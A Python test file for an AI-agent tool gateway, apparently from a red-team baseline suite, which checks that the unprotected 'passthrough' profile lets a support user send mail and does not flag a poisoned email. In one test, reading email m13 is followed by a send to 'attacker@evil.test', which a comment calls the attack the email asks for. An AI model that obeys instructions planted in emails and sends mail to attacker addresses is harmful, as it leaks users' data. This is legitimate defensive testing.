"""KS-902: the passthrough profile, the baseline of the red-team runs (C0).

Every slot of the pipeline but the credentials is a stub, the scanner is not built, and the audit
record is still written. A gateway in this profile defends nothing, and the tests show it: a user of
the support team makes a call that the policy refuses everywhere else, a poisoned email taints
nobody, and the gateway says what it is at /metrics.
"""

import re
from collections.abc import Callable, Iterator
from pathlib import Path
from typing import Any

import httpx
import pytest

from examples.upstreams import mail_server
from keystone.registry.config import UpstreamConfig
from tests.fixtures.keystone import KeystoneApp, McpConnect, demo_tools
from tests.fixtures.mcp_results import one
from tests.fixtures.servers import ServerThread

pytestmark = [pytest.mark.phase(9), pytest.mark.services]

Factory = Callable[..., KeystoneApp]
WHOAMI = "keystone__whoami"
MAIL = {"to": "colleague@acme.test", "subject": "Hello", "body": "A line."}


@pytest.fixture
def poisoned_mail(tmp_path: Path) -> Iterator[ServerThread]:
    server = mail_server.create_server(tmp_path / "mail.db", poisoned=True)
    thread = ServerThread(server.streamable_http_app()).start()
    yield thread
    thread.stop()


def mail_only(factory: Factory, poisoned_mail: ServerThread, **settings: Any) -> KeystoneApp:
    mail = UpstreamConfig(
        id="mail", tenant="acme", url=f"{poisoned_mail.url}/mcp", tools=demo_tools("mail")
    )
    return factory(settings={"upstreams": [mail], **settings})


def sent(thread: ServerThread) -> list[dict[str, Any]]:
    mails: list[dict[str, Any]] = httpx.get(f"{thread.url}/_state", timeout=10).json()["sent"]
    return mails


def series(app: KeystoneApp, name: str) -> list[str]:
    page = httpx.get(f"{app.base}/metrics", timeout=10).text
    return re.findall(rf"^{name}\{{[^}}]*\}} [0-9.e+-]+$", page, re.MULTILINE)


async def test_a_support_user_makes_a_call_that_the_policy_refuses_in_a_full_gateway(
    keystone_app_factory: Factory, mcp_client: McpConnect, poisoned_mail: ServerThread
) -> None:
    full = mail_only(keystone_app_factory, poisoned_mail)
    async with mcp_client(full, user="alice") as client:
        # In a full gateway the tool is high risk and alice is no operator: it is not even listed.
        names = {t.name for t in (await client.list_tools()).tools}
    assert "mail__send_email" not in names

    baseline = mail_only(keystone_app_factory, poisoned_mail, profile="passthrough")
    async with mcp_client(baseline, user="alice") as client:
        names = {t.name for t in (await client.list_tools()).tools}
        result = await client.call_tool("mail__send_email", MAIL)

    assert not result.is_error
    assert [mail["to"] for mail in sent(poisoned_mail)] == ["colleague@acme.test"]


async def test_the_passthrough_gateway_scans_nothing_and_taints_nobody(
    keystone_app_factory: Factory, mcp_client: McpConnect, poisoned_mail: ServerThread
) -> None:
    app = mail_only(keystone_app_factory, poisoned_mail, profile="passthrough")

    async with mcp_client(app, user="olivia") as client:
        await client.call_tool("mail__read_email", {"email_id": "m13"})
        state: dict[str, Any] = one(await client.call_tool(WHOAMI, {}))
        # The attack the email asks for: nothing stops it, and nothing asks anybody.
        attack = {**MAIL, "to": "attacker@evil.test"}
        sent_mail = await client.call_tool("mail__send_email", attack)

    assert (state["tainted"], state["flags"]) == (False, [])
    assert not sent_mail.is_error
    assert [mail["to"] for mail in sent(poisoned_mail)] == ["attacker@evil.test"]
    # The audit record is the pipeline's own, so the baseline has one for each call.
    rows = app.audit.records
    assert rows and {row["effect"] for row in rows} == {"allow"}
    assert all(row["scan_score"] is None for row in rows)


async def test_the_gateway_says_its_profile_and_whether_it_scans(
    keystone_app_factory: Factory, poisoned_mail: ServerThread
) -> None:
    baseline = mail_only(keystone_app_factory, poisoned_mail, profile="passthrough")
    full = mail_only(keystone_app_factory, poisoned_mail)

    assert series(baseline, "keystone_gateway_info") == [
        'keystone_gateway_info{profile="passthrough",scanner="off"} 1.0'
    ]
    assert series(full, "keystone_gateway_info") == [
        'keystone_gateway_info{profile="full",scanner="on"} 1.0'
    ]
